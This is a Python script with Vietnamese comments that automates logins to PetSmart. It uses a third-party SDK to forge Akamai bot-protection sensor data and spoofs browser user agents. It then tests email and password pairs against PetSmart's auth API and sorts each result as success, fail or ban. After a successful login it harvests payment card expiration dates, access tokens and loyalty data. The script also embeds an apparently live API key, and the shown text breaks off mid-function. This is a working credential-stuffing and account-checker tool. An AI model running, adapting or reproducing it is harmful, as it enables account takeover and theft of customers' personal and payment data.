"""
Petsmart Akamai Flow với Hyper Solutions SDK
Test flow để bypass Akamai protection trên Petsmart
"""

from flowlite import Flow, step, expect, http, js, finalize
from flowlite.plugins.captcha_wrapper import CaptchaWrapper
from flowlite.plugins.cookie_manager import CookieManager
from flowlite.plugins.hyper_solutions import HyperSolutionsPlugin
from flowlite.plugins.parse_between_strings import _parse_between
from hyper_sdk.akamai import parse_script_path
import json
import random
import string
import logging

# Tắt logs
logging.getLogger().setLevel(logging.CRITICAL)

# Tạo instance Flow
flow = Flow("petsmart_akamai")

# Thêm các plugin cần thiết
flow.use(CookieManager)
flow.use(CaptchaWrapper)
flow.use(HyperSolutionsPlugin, 
         api_key="0a3aa097-fc92-4a3b-b18b-de7c8935dc22",  # Thay bằng API key thật
         bypass_sites=["petsmart"],
         auto_bypass=True,
         retry_on_failure=True,
         max_retries=3)

# Tắt debug
flow.debug(trace=False, body_preview=0, curl=False)

@step("parse_input_data")
def parse_input_data(ctx):
    """Step 0: Parse dữ liệu đầu vào từ context"""
    # print("DEBUG - Step 0: Parsing input data...")
    
    # Lấy dữ liệu từ context
    input_data = ctx.get("data", {})
    
    # Parse các giá trị cần thiết
    email = input_data.get("Email", "")
    password = input_data.get("Pass", "")
    
    print(f"DEBUG - Testing EMAIL: {email} PASS: {password}")
    # print(f"DEBUG - Parsed PASS: {password}")
    
    # Lưu vào context để sử dụng trong các step khác
    ctx.email = email
    ctx.password = password
    
    # Kiểm tra dữ liệu bắt buộc
    if not email or not password:
        print("❌ Missing required data: EMAIL or PASS")
        ctx.status = "ERROR"
        ctx.error_reason = "Missing required input data"
        raise Exception("Missing required input data")
    
    # Kiểm tra định dạng email
    import re
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(email_pattern, email):
        print(f"❌ Invalid email format: {email}")
        ctx.status = "FAIL"
        ctx.error_reason = "Invalid email format"
        raise Exception("Invalid email format")
    
    # Kiểm tra độ dài password
    if len(password) < 8:
        print(f"❌ Password too short: {len(password)} characters (minimum 8)")
        ctx.status = "FAIL"
        ctx.error_reason = "Password too short"
        raise Exception("Password too short")
    
    # Random User-Agent Chrome Windows 10-11 với độ uy tín cao
    import random
    
    chrome_versions = [
        "140.0.0.0"
    ]
    
    windows_versions = [
        "Windows NT 10.0; Win64; x64",
        #"Windows NT 10.0; WOW64",
        #"Windows NT 10.0; Win64; x64; rv:109.0"
    ]
    
    chrome_version = random.choice(chrome_versions)
    windows_version = random.choice(windows_versions)
    
    # Tạo User-Agent Chrome Windows với độ uy tín cao
    user_agent = f"Mozilla/5.0 ({windows_version}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36"
    
    # Lưu User-Agent vào context
    ctx.user_agent = user_agent
    
    print(f"✅ Generated Chrome User-Agent: {user_agent}")
    print("✅ Input data parsed and validated successfully")
    ctx.input_parsed = True

@step("get_petsmart_homepage")
def get_petsmart_homepage(ctx):
    """Step 1: Gọi đến trang chủ Petsmart"""
    # print("DEBUG - Step 1: Getting Petsmart homepage...")
    
    # Lấy User-Agent từ context
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    
    url = "https://www.petsmart.com/sign-in/"
    
    r = (http.get(url)
           .header("Host", "www.petsmart.com")
           .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
           .header("Upgrade-Insecure-Requests", "1")
           .header("User-Agent", user_agent)
           .header("Accept-Language", "en-US,en;q=0.9")
           .header("Accept-Encoding", "gzip, deflate, br")
           .label("petsmart-homepage")
           .via_tls()
           .send())
    
    ctx.homepage_status = r.status
    ctx.homepage_response = r.text()
    ctx.homepage_headers = dict(r.headers)
    
    # print(f"DEBUG - Homepage Status: {r.status}")
    # print(f"DEBUG - Response Length: {len(r.text())}")
    
    # Parse script tags từ response
    response_text = r.text()
    
    # Sử dụng Hyper SDK để parse script path
    try:
        script_path = parse_script_path(response_text)
        # print(f"DEBUG - Hyper SDK script path: {script_path}")
        ctx.hyper_script_path = script_path
    except Exception as e:
        # print(f"DEBUG - Hyper SDK parse_script_path failed: {e}")
        ctx.hyper_script_path = None
    
    # Kiểm tra xem có bị block không
    if r.status == 403 or "blocked" in r.text().lower() or "access denied" in r.text().lower():
        ctx.status = "BLOCKED"
        # print("❌ Access blocked by Akamai")
    elif r.status == 200:
        ctx.status = "SUCCESS"
        # print("✅ Successfully accessed Petsmart homepage")
    else:
        ctx.status = "ERROR"
        # print(f"❌ Unexpected status: {r.status}")

@step("get_hyper_script")
def get_hyper_script(ctx):
    """Step 2: Gọi đến hyper_script_path từ Hyper SDK"""
    # print("DEBUG - Step 2: Getting hyper script...")
    
    # Lấy User-Agent từ context
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    
    # Kiểm tra xem có hyper_script_path không
    hyper_script_path = ctx.get("hyper_script_path")
    if not hyper_script_path:
        # print("❌ No hyper_script_path found from previous step")
        ctx.status = "ERROR"
        return
    
    # Tạo URL đầy đủ
    url = f"https://www.petsmart.com{hyper_script_path}"
    # print(f"DEBUG - Calling hyper script URL: {url}")
    
    r = (http.get(url)
           .header("Accept", "*/*")
           .header("Accept-Encoding", "gzip, deflate, br")
           .header("User-Agent", user_agent)
           .header("Accept-Language", "en-US,en;q=0.9")
           .header("Referer", "https://www.petsmart.com/")
           .label("hyper-script")
           .via_tls()
           .send())
    
    ctx.hyper_script_status = r.status
    ctx.hyper_script_response = r.text()
    ctx.hyper_script_headers = dict(r.headers)
    ctx.script_content = r.text()  # Lưu response body vào script_content
    
    # print(f"DEBUG - Hyper Script Status: {r.status}")
    # print(f"DEBUG - Hyper Script Response Length: {len(r.text())}")
    
    # Kiểm tra kết quả
    if r.status == 200:
        # print("✅ Successfully got hyper script")
        ctx.hyper_script_success = True
    else:
        # print(f"❌ Failed to get hyper script: {r.status}")
        ctx.hyper_script_success = False

@step("extract_cookies")
def extract_cookies(ctx):
    """Step 3: Lấy giá trị _abck và bm_sz từ cookies"""
    # print("DEBUG - Step 3: Extracting cookies...")
    
    # Lấy cookies từ session (CookieManager plugin sẽ quản lý)
    cookies = ctx.session.get("cookies", {})
    
    # Lấy giá trị _abck và bm_sz
    current_abck_cookie = cookies.get("_abck", "")
    bm_sz_cookie = cookies.get("bm_sz", "")
    
    # print(f"DEBUG - _abck cookie: {current_abck_cookie[:50]}..." if current_abck_cookie else "DEBUG - _abck cookie: Not found")
    # print(f"DEBUG - bm_sz cookie: {bm_sz_cookie[:50]}..." if bm_sz_cookie else "DEBUG - bm_sz cookie: Not found")
    
    # Lưu vào context
    ctx.current_abck_cookie = current_abck_cookie
    ctx.bm_sz_cookie = bm_sz_cookie
    
    # Kiểm tra xem có cookies không
    if current_abck_cookie and bm_sz_cookie:
        # print("✅ Both _abck and bm_sz cookies found")
        ctx.cookies_found = True
    elif current_abck_cookie or bm_sz_cookie:
        # print("⚠️ Only one cookie found")
        ctx.cookies_found = False
    else:
        # print("❌ No _abck or bm_sz cookies found")
        ctx.cookies_found = False

@step("get_client_ip")
def get_client_ip(ctx):
    """Step 4: Lấy IP address từ ipify API"""
    # print("DEBUG - Step 4: Getting client IP...")
    
    # Lấy User-Agent từ context
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    
    url = "https://api.ipify.org/?format=json"
    
    r = (http.get(url)
           .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
           .header("Accept-Encoding", "gzip, deflate, br, zstd")
           .header("Accept-Language", "en-US,en;q=0.9")
           .header("Priority", "u=0, i")
           .header("Sec-Ch-Ua", '"Chromium";v="140", "Not=A?Brand";v="24", "Microsoft Edge";v="140"')
           .header("Sec-Ch-Ua-Mobile", "?0")
           .header("Sec-Ch-Ua-Platform", '"macOS"')
           .header("Sec-Fetch-Dest", "document")
           .header("Sec-Fetch-Mode", "navigate")
           .header("Sec-Fetch-Site", "none")
           .header("Sec-Fetch-User", "?1")
           .header("Upgrade-Insecure-Requests", "1")
           .header("User-Agent", user_agent)
           .label("ipify-api")
           .via_tls()
           .send())
    
    ctx.ipify_status = r.status
    ctx.ipify_response = r.text()
    
    # print(f"DEBUG - IPify Status: {r.status}")
    # print(f"DEBUG - IPify Response: {r.text()}")
    
    # Parse IP từ response body
    response_text = r.text()
    client_ip = _parse_between(response_text, '{"ip":"', '"}')
    
    if client_ip:
        # print(f"DEBUG - Client IP: {client_ip}")
        ctx.client_ip = client_ip
        ctx.ip_found = True
    else:
        # print("❌ Failed to extract IP from response")
        ctx.client_ip = ""
        ctx.ip_found = False

@step("generate_sensor_data")
def generate_sensor_data(ctx):
    """Step 5: Generate sensor data using Hyper Solutions API"""
    # print("DEBUG - Step 5: Generating sensor data...")
    
    # Lấy plugin Hyper Solutions từ context
    hyper_plugin = None
    if hasattr(ctx, 'vars') and hasattr(ctx.vars, 'hyper_solutions'):
        hyper_plugin = ctx.vars.hyper_solutions
    elif hasattr(ctx, 'hyper_solutions'):
        hyper_plugin = ctx.hyper_solutions
    
    if not hyper_plugin:
        # print("❌ Hyper Solutions plugin not found in context")
        # print("DEBUG - Available ctx attributes:", dir(ctx))
        if hasattr(ctx, 'vars'):
            print("DEBUG - Available ctx.vars attributes:", dir(ctx.vars))
        
        # Fallback: Tạo Hyper Solutions session trực tiếp
        try:
            from hyper_sdk import Session
            # print("DEBUG - Creating Hyper Solutions session directly...")
            hyper_session = Session("your_hyper_solutions_api_key_here")  # Thay bằng API key thật
            hyper_plugin = type('MockPlugin', (), {'session': hyper_session})()
            # print("✅ Created Hyper Solutions session directly")
        except Exception as e:
            # print(f"❌ Failed to create Hyper Solutions session: {e}")
            ctx.sensor_generation_success = False
            return
    
    # Lấy các giá trị cần thiết
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    current_abck_cookie = ctx.get("current_abck_cookie", "")
    bm_sz_cookie = ctx.get("bm_sz_cookie", "")
    script_content = ctx.get("script_content", "")
    client_ip = ctx.get("client_ip", "")
    
    # print(f"DEBUG - User Agent: {user_agent}")
    # print(f"DEBUG - _abck cookie: {current_abck_cookie[:50]}..." if current_abck_cookie else "DEBUG - _abck cookie: Not found")
    # print(f"DEBUG - bm_sz cookie: {bm_sz_cookie[:50]}..." if bm_sz_cookie else "DEBUG - bm_sz cookie: Not found")
    # print(f"DEBUG - Script content length: {len(script_content)}")
    # print(f"DEBUG - Client IP: {client_ip}")
    
    # Kiểm tra các tham số bắt buộc
    if not client_ip:
        # print("❌ Client IP is required for sensor generation")
        ctx.sensor_generation_success = False
        return
    
    try:
        # Sử dụng Hyper Solutions API để generate sensor data
        from hyper_sdk import SensorInput
        
        sensor_input = SensorInput(
            page_url="https://www.petsmart.com/api/hcp/auth",
            user_agent=user_agent,
            abck=current_abck_cookie,  # Current _abck cookie value
            bmsz=bm_sz_cookie,         # bm_sz cookie value
            version="3",               # Akamai version
            script=script_content,     # Full script content (first request only)
            scriptUrl=f"https://www.petsmart.com{ctx.get('hyper_script_path', '')}",  # Script URL
            context="",                # Previous context (empty on first request)
            acceptLanguage="en-US,en;q=0.9",
            ip=client_ip              # Required: client IP address
        )
        
        # print("DEBUG - Calling Hyper Solutions generate_sensor_data...")
        sensor_data, sensor_context = hyper_plugin.session.generate_sensor_data(sensor_input)
        
        # print(f"DEBUG - Sensor data generated successfully")
        # print(f"DEBUG - Sensor data length: {len(sensor_data) if sensor_data else 0}")
        # print(f"DEBUG - Sensor context: {sensor_context}")
        # print("=" * 80)
        # print("DEBUG - SENSOR DATA 1 RESPONSE BODY:")
        # print("=" * 80)
        # print(sensor_data)
        # print("=" * 80)
        
        # Lưu kết quả vào context
        ctx.sensor_data = sensor_data
        ctx.sensor_context = sensor_context
        ctx.sensor_generation_success = True
        
        # print("✅ Sensor data generated successfully")
        
    except Exception as e:
        # print(f"❌ Failed to generate sensor data: {e}")
        ctx.sensor_data = ""
        ctx.sensor_context = ""
        ctx.sensor_generation_success = False

@step("post_sensor_data")
def post_sensor_data(ctx):
    """Step 6: POST sensor data đến hyper script URL"""
    # print("DEBUG - Step 6: Posting sensor data...")
    
    # Lấy User-Agent từ context
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    
    # Lấy sensor data từ step trước
    sensor_data = ctx.get("sensor_data", "")
    hyper_script_path = ctx.get("hyper_script_path", "")
    
    if not sensor_data:
        # print("❌ No sensor data found from previous step")
        ctx.sensor_post_success = False
        return
    
    if not hyper_script_path:
        # print("❌ No hyper_script_path found")
        ctx.sensor_post_success = False
        return
    
    # Tạo URL
    url = f"https://www.petsmart.com{hyper_script_path}"
    # print(f"DEBUG - Posting to URL: {url}")
    
    # print(f"DEBUG - Sensor data length: {len(sensor_data)}")
    # print(f"DEBUG - Sensor data preview: {sensor_data[:200]}...")
    
    try:
        r = (http.post(url)
               .header("Accept", "*/*")
               .header("Content-Type", "text/plain;charset=UTF-8")
               .header("Origin", "https://www.petsmart.com")
               .header("Accept-Language", "en-US,en;q=0.9")
               .header("User-Agent", user_agent)
               .header("Referer", "https://www.petsmart.com/")
               .header("Accept-Encoding", "gzip, deflate, br")
               .json({"sensor_data": sensor_data})
               .label("post-sensor-data")
               .via_tls()
               .send())
        
        ctx.sensor_post_status = r.status
        ctx.sensor_post_response = r.text()
        ctx.sensor_post_headers = dict(r.headers)
        
        # print(f"DEBUG - Sensor POST Status: {r.status}")
        # print(f"DEBUG - Sensor POST Response Length: {len(r.text())}")
        # print("=" * 80)
        # print("DEBUG - SENSOR POST RESPONSE BODY:")
        # print("=" * 80)
        # print(r.text())
        # print("=" * 80)
        
        # In ra cookies nhận được sau POST
        # print("🍪 COOKIES RECEIVED AFTER SENSOR POST:")
        # print("-" * 60)
        response_cookies = dict(r.headers).get('Set-Cookie', '')
        
        # Lấy cookies từ session sau POST
        session_cookies = ctx.session.get("cookies", {})
        # print(f"Session cookies count: {len(session_cookies)}")
        
        # Kiểm tra kết quả
        if r.status == 201:
            # print("✅ Sensor data posted successfully")
            ctx.sensor_post_success = True
        else:
            # print(f"❌ Failed to post sensor data: {r.status}")
            ctx.sensor_post_success = False
            
    except Exception as e:
        # print(f"❌ Exception while posting sensor data: {e}")
        ctx.sensor_post_status = 0
        ctx.sensor_post_response = ""
        ctx.sensor_post_success = False

@step("check_abck_cookie")
def check_abck_cookie(ctx):
    """Step 7: Kiểm tra _abck cookie có ~0~ không"""
    # print("DEBUG - Step 7: Checking _abck cookie...")
    
    # Lấy User-Agent từ context
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    
    # Lấy cookies mới từ post_sensor_data (CookieManager đã cập nhật)
    cookies = ctx.session.get("cookies", {})
    current_abck_cookie = cookies.get("_abck")
    
    if not current_abck_cookie:
        # print("❌ No _abck cookie found in session - BAN status")
        ctx.status = "BAN"
        ctx.abck_validation_complete = False
        ctx.abck_validation_reason = "No _abck cookie found"
        return
    
    # print(f"DEBUG - Current _abck cookie: {current_abck_cookie[:100]}...")
    
    # Kiểm tra pattern ~0~ trong _abck cookie
    if "~0~" in current_abck_cookie:
        # print("✅ Found ~0~ pattern in _abck cookie - jumping to auth API!")
        ctx.abck_validation_complete = True
        ctx.abck_validation_reason = "~0~ pattern found"
        return
    
    # Nếu không có ~0~, generate sensor data thêm 1 lần nữa
    # print("❌ No ~0~ pattern found - generating additional sensor data...")
    
    # Lấy plugin Hyper Solutions
    hyper_plugin = None
    if hasattr(ctx, 'vars') and hasattr(ctx.vars, 'hyper_solutions'):
        hyper_plugin = ctx.vars.hyper_solutions
    elif hasattr(ctx, 'hyper_solutions'):
        hyper_plugin = ctx.hyper_solutions
    
    if not hyper_plugin:
        # print("❌ Hyper Solutions plugin not found")
        ctx.abck_validation_complete = False
        return
    
    # Lấy các giá trị cần thiết
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    bm_sz_cookie = cookies.get("bm_sz")
    client_ip = ctx.get("client_ip", "")
    latest_context = ctx.get("sensor_context", "")
    
    # print(f"DEBUG - Using context from previous generation: {latest_context[:100]}..." if latest_context else "DEBUG - No previous context found")
    
    try:
        from hyper_sdk import SensorInput
        
        # Generate sensor data lần 2 (không có script content)
        sensor_input = SensorInput(
            page_url="https://www.petsmart.com/api/hcp/auth",
            user_agent=user_agent,
            abck=current_abck_cookie,
            bmsz=bm_sz_cookie,
            version="3",
            script="",  # Không truyền script content
            scriptUrl=f"https://www.petsmart.com{ctx.get('hyper_script_path', '')}",
            context=latest_context,  # Sử dụng context từ lần trước
            acceptLanguage="en-US,en;q=0.9",
            ip=client_ip
        )
        
        # print("DEBUG - Generating additional sensor data...")
        sensor_data_2, sensor_context_2 = hyper_plugin.session.generate_sensor_data(sensor_input)
        
        # print(f"DEBUG - Additional sensor data generated successfully")
        # print(f"DEBUG - Additional sensor data length: {len(sensor_data_2) if sensor_data_2 else 0}")
        # print("=" * 80)
        # print("DEBUG - ADDITIONAL SENSOR DATA RESPONSE BODY:")
        # print("=" * 80)
        # print(sensor_data_2)
        # print("=" * 80)
        
        # Lưu kết quả
        ctx.sensor_data_2 = sensor_data_2
        ctx.sensor_context_2 = sensor_context_2
        ctx.sensor_generation_2_success = True
        
        # print("✅ Additional sensor data generated successfully")
        
        # POST sensor data lần 2
        # print("DEBUG - Posting additional sensor data...")
        url = f"https://www.petsmart.com{ctx.get('hyper_script_path', '')}"
        
        try:
            r2 = (http.post(url)
                     .header("Accept", "*/*")
                     .header("Content-Type", "text/plain;charset=UTF-8")
                     .header("Origin", "https://www.petsmart.com")
                     .header("Accept-Language", "en-US,en;q=0.9")
                     .header("User-Agent", user_agent)
                     .header("Referer", "https://www.petsmart.com/")
                     .header("Accept-Encoding", "gzip, deflate, br")
                     .json({"sensor_data": sensor_data_2})
                     .label("post-sensor-data-2")
                     .via_tls()
                     .send())
            
            ctx.sensor_post_2_status = r2.status
            ctx.sensor_post_2_response = r2.text()
            
            # print(f"DEBUG - Additional sensor POST Status: {r2.status}")
            # print("=" * 80)
            # print("DEBUG - ADDITIONAL SENSOR POST RESPONSE BODY:")
            # print("=" * 80)
            #print(r2.text())
            # print("=" * 80)
            
            # In ra cookies sau POST lần 2
            # print("🍪 COOKIES AFTER ADDITIONAL SENSOR POST:")
            # print("-" * 60)
            session_cookies_2 = ctx.session.get("cookies", {})
            # print(f"Session cookies count: {len(session_cookies_2)}")
            
            if r2.status == 201:
                # print("✅ Additional sensor data posted successfully")
                ctx.sensor_post_2_success = True
            else:
                # print(f"❌ Failed to post additional sensor data: {r2.status}")
                ctx.sensor_post_2_success = False
                
        except Exception as e:
            # print(f"❌ Exception while posting additional sensor data: {e}")
            ctx.sensor_post_2_status = 0
            ctx.sensor_post_2_response = ""
            ctx.sensor_post_2_success = False

        # Kiểm tra lại _abck cookie sau lần 2
        cookies_after_2 = ctx.session.get("cookies", {})
        current_abck_after_2 = cookies_after_2.get("_abck")
        
        if current_abck_after_2 and "~0~" in current_abck_after_2:
            # print("✅ Found ~0~ pattern after 2nd sensor - jumping to auth API!")
            ctx.abck_validation_complete = True
            ctx.abck_validation_reason = "~0~ pattern found after 2nd sensor"
        else:
            # print("❌ Still no ~0~ pattern - generating 3rd sensor data...")
            
            # Generate sensor data lần 3 (lấy context từ lần 2)
            try:
                sensor_input_3 = SensorInput(
                    page_url="https://www.petsmart.com/api/hcp/auth",
                    user_agent=user_agent,
                    abck=current_abck_after_2 or current_abck_cookie,
                    bmsz=bm_sz_cookie,
                    version="3",
                    script="",  # Không truyền script content
                    scriptUrl=f"https://www.petsmart.com{ctx.get('hyper_script_path', '')}",
                    context=sensor_context_2,  # Sử dụng context từ lần 2
                    acceptLanguage="en-US,en;q=0.9",
                    ip=client_ip
                )

                # print("DEBUG - Generating 3rd sensor data...")
                sensor_data_3, sensor_context_3 = hyper_plugin.session.generate_sensor_data(sensor_input_3)

                # print(f"DEBUG - 3rd sensor data generated successfully")
                # print(f"DEBUG - 3rd sensor data length: {len(sensor_data_3) if sensor_data_3 else 0}")
                # print("=" * 80)
                # print("DEBUG - 3RD SENSOR DATA RESPONSE BODY:")
                # print("=" * 80)
                # print(sensor_data_3)
                # print("=" * 80)

                # Lưu kết quả
                ctx.sensor_data_3 = sensor_data_3
                ctx.sensor_context_3 = sensor_context_3
                ctx.sensor_generation_3_success = True

                # print("✅ 3rd sensor data generated successfully")

                # POST sensor data lần 3
                # print("DEBUG - Posting 3rd sensor data...")
                url_3 = f"https://www.petsmart.com{ctx.get('hyper_script_path', '')}"

                try:
                    r3 = (http.post(url_3)
                            .header("Accept", "*/*")
                            .header("Content-Type", "text/plain;charset=UTF-8")
                            .header("Origin", "https://www.petsmart.com")
                            .header("Accept-Language", "en-US,en;q=0.9")
                            .header("User-Agent", user_agent)
                            .header("Referer", "https://www.petsmart.com/")
                            .header("Accept-Encoding", "gzip, deflate, br")
                            .json({"sensor_data": sensor_data_3})
                            .label("post-sensor-data-3")
                            .via_tls()
                            .send())

                    ctx.sensor_post_3_status = r3.status
                    ctx.sensor_post_3_response = r3.text()

                    # print(f"DEBUG - 3rd sensor POST Status: {r3.status}")
                    # print("=" * 80)
                    # print("DEBUG - 3RD SENSOR POST RESPONSE BODY:")
                    # print("=" * 80)
                    #print(r3.text())
                    # print("=" * 80)

                    # In ra cookies sau POST lần 3
                    # print("🍪 COOKIES AFTER 3RD SENSOR POST:")
                    # print("-" * 60)
                    session_cookies_3 = ctx.session.get("cookies", {})
                    # print(f"Session cookies count: {len(session_cookies_3)}")

                    if r3.status == 201:
                        # print("✅ 3rd sensor data posted successfully")
                        ctx.sensor_post_3_success = True
                    else:
                        # print(f"❌ Failed to post 3rd sensor data: {r3.status}")
                        ctx.sensor_post_3_success = False

                except Exception as e:
                    # print(f"❌ Exception while posting 3rd sensor data: {e}")
                    ctx.sensor_post_3_status = 0
                    ctx.sensor_post_3_response = ""
                    ctx.sensor_post_3_success = False

            except Exception as e:
                # print(f"❌ Failed to generate 3rd sensor data: {e}")
                ctx.sensor_generation_3_success = False

        ctx.abck_validation_complete = True
        ctx.abck_validation_reason = "Generated and posted up to 3 sensor data attempts"

    except Exception as e:
        # print(f"❌ Failed to generate additional sensor data: {e}")
        ctx.abck_validation_complete = False
        ctx.abck_validation_reason = f"Failed to generate additional sensor data: {e}"

@step("print_final_cookies")
def print_final_cookies(ctx):
    """Step 8: In ra tất cả cookies cuối cùng sau khi hoàn thành"""
    # print("DEBUG - Step 8: Printing final cookies...")
    
    # Lấy tất cả cookies từ session (CookieManager đã cập nhật)
    cookies = ctx.session.get("cookies", {})
    
    # print("=" * 100)
    # print("FINAL COOKIES AFTER ALL UPDATES:")
    # print("=" * 100)
    
    if not cookies:
        # print("❌ No cookies found in session")
        ctx.final_cookies = {}
    else:
        
        # Lưu cookies vào context
        ctx.final_cookies = cookies
        
        # In ra cookies quan trọng
        important_cookies = ["_abck", "bm_sz"]
        # print("🔍 IMPORTANT COOKIES:")
        # print("-" * 50)
        for cookie_name in important_cookies:
            if cookie_name in cookies:
                value = cookies[cookie_name]
            else:
                print(f"❌ {cookie_name}: Not found")
        # print("-" * 50)
    
    # print("=" * 100)

@step("call_auth_api")
def call_auth_api(ctx):
    """Step 9: Call đến API auth cuối cùng"""
    # print("DEBUG - Step 9: Calling auth API...")
    
    # Lấy User-Agent từ context
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    
    url = "https://www.petsmart.com/api/hcp/auth"
    
    # Tạo payload JSON từ dữ liệu đã parse
    auth_payload = {
        "email": ctx.get("email", ""),
        "password": ctx.get("password", "")
    }
    
    # print(f"DEBUG - Auth API URL: {url}")
    # print(f"DEBUG - Auth payload: {auth_payload}")
    
    try:
        r = (http.post(url)
               .header("Accept", "*/*")
               .header("Content-Type", "text/plain;charset=UTF-8")
               .header("Origin", "https://www.petsmart.com")
               .header("Accept-Language", "en-US,en;q=0.9")
               .header("User-Agent", user_agent)
               .header("Referer", "https://www.petsmart.com/")
               .header("Accept-Encoding", "gzip, deflate, br")
               .json(auth_payload)
               .label("auth-api")
               .via_tls()
               .send())
        
        ctx.auth_status = r.status
        ctx.auth_response = r.text()
        ctx.auth_headers = dict(r.headers)
        
        # print(f"DEBUG - Auth API Status: {r.status}")
        # print(f"DEBUG - Auth API Response Length: {len(r.text())}")
        # print("=" * 80)
        # print("AUTH API RESPONSE BODY:")
        # print("=" * 80)
        # print(r.text())
        # print("=" * 80)
        
        # In ra cookies sau auth API
        # print("🍪 COOKIES AFTER AUTH API:")
        # print("-" * 60)
        auth_cookies = ctx.session.get("cookies", {})
        
        # Kiểm tra kết quả dựa trên response body
        response_text = r.text()
        
        # Kiểm tra các trường hợp FAIL
        if ("success\":false" in response_text or 
            "some inputs are invalid" in response_text.lower() or 
            "credentials could not be authenticated" in response_text.lower()):
            print("❌ PETSMART Auth failed - Invalid credentials or inputs")
            ctx.status = "FAIL"
            ctx.auth_success = False
            ctx.auth_failure_reason = "Invalid credentials or inputs"
            return
        
        # Kiểm tra các trường hợp SUCCESS
        elif ("success\":true" in response_text or 
              "\"customer\":{\"id\"" in response_text):
            print("✅ PETSMART Auth successful - Login successful")
            ctx.status = "SUCCESS"
            ctx.auth_success = True
            ctx.auth_success_reason = "Login successful"
        
        # Kiểm tra status code
        elif r.status == 200:
            print("✅ PETSMART Auth API called successfully (200 OK)")
            ctx.status = "SUCCESS"
            ctx.auth_success = True
            ctx.auth_success_reason = "200 OK response"
        
        # Các trường hợp ngoại lệ - BAN
        else:
            print(f"❌ PETSMART Auth API failed with status {r.status} - Possible ban")
            ctx.status = "BAN"
            ctx.auth_success = False
            ctx.auth_failure_reason = f"Unexpected status {r.status} - Possible ban"
            return
            
    except Exception as e:
        print(f"❌ Exception while calling auth API: {e}")
        ctx.auth_status = 0
        ctx.auth_response = ""
        ctx.auth_success = False

@step("get_payments")
def get_payments(ctx):
    """Step 10: Gọi API payments để lấy thông tin thanh toán"""
    # print("DEBUG - Step 10: Getting payments...")
    if not ctx.auth_success:
        return

    # Lấy User-Agent từ context
    user_agent = ctx.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
    
    url = "https://www.petsmart.com/api/acp/account/payments"

    # print(f"DEBUG - Payments API URL: {url}")

    try:
        r = (http.get(url)
               .header("Accept", "*/*")
               .header("Content-Type", "text/plain;charset=UTF-8")
               .header("Origin", "https://www.petsmart.com")
               .header("Accept-Language", "en-US,en;q=0.9")
               .header("User-Agent", user_agent)
               .header("Referer", "https://www.petsmart.com/")
               .header("Accept-Encoding", "gzip, deflate, br")
               .label("payments-api")
               .via_tls()
               .send())

        ctx.payments_status = r.status
        ctx.payments_response = r.text()
        ctx.payments_headers = dict(r.headers)

        # print(f"DEBUG - Payments API Status: {r.status}")
        # print(f"DEBUG - Payments API Response Length: {len(r.text())}")
        # print("=" * 80)
        # print("PAYMENTS API RESPONSE BODY:")
        # print("=" * 80)
        # print(r.text())
        # print("=" * 80)

        # In ra cookies sau payments API
        # print("🍪 COOKIES AFTER PAYMENTS API:")
        # print("-" * 60)
        payments_cookies = ctx.session.get("cookies", {})

        # Lấy tất cả giá trị expiration từ response body
        import re
        response_text = r.text()
        expiration_pattern = r'"expiration":"([^"]+)"'
        expiration_matches = re.findall(expiration_pattern, response_text)
        
        # print(f"DEBUG - Found {len(expiration_matches)} expiration values:")
        for i, exp in enumerate(expiration_matches, 1):
            print(f"  {i}. {exp}")
        
        # Lưu vào context
        ctx.payment_card_exp = expiration_matches
        ctx.payment_card_exp_count = len(expiration_matches)
        
        print(f"✅ Extracted {len(expiration_matches)} payment card expiration dates")
        
        # Kiểm tra kết quả
        if r.status == 200:
            # print("✅ Payments API called successfully")
            ctx.payments_success = True
        else:
            print(f"❌ Payments API failed: {r.status}")
            ctx.payments_success = False

    except Exception as e:
        print(f"❌ Exception while calling payments API: {e}")
        ctx.payments_status = 0
        ctx.payments_response = ""
        ctx.payments_success = False

@step("get_access_token")
def get_access_token(ctx):
    """Step 11: Lấy accessToken từ cookie manager"""
    if not ctx.auth_success:
        return
    # print("DEBUG - Step 11: Getting access token from cookies...")

    # Lấy cookies từ session (CookieManager đã cập nhật)
    cookies = ctx.session.get("cookies", {})
    access_token = cookies.get("accessToken", "")

    if access_token:
        # print(f"DEBUG - Found accessToken: {access_token[:50]}..." if len(access_token) > 50 else f"DEBUG - Found accessToken: {access_token}")
        ctx.accessToken = access_token
        # print("✅ Access token extracted successfully")
    else:
        # print("❌ No accessToken found in cookies")
        ctx.accessToken = ""
        # print("❌ Failed to extract access token")

@step("get_loyalty_points")
def get_loyalty_points(ctx):
    """Step 12: Gọi API loyalty để lấy thông tin điểm thưởng"""
    if not ctx.auth_success:
